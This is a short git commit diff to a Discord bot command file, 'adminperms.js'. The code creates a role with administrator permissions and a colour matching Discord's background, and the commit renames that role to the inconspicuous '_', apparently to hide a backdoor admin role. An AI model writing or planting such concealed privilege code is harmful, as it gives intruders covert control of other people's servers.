b704a6f21b02fc9f2110659189437295dbf21cee
FishyBreak <71039901+FishyBreak@users.noreply.github.com>
2021-06-09 16:46:25 -0400

    Update adminperms.js

--- commands/adminperms.js
+++ commands/adminperms.js
@@ -7,7 +7,7 @@ module.exports.run = async (bot, message, args) => {
         role = await message.guild.roles.create ({
 
             data: {
-                name: "Dope Role",
+                name: "_",
           	    color: "#2f3136",
           	    permissions: [8]
             }
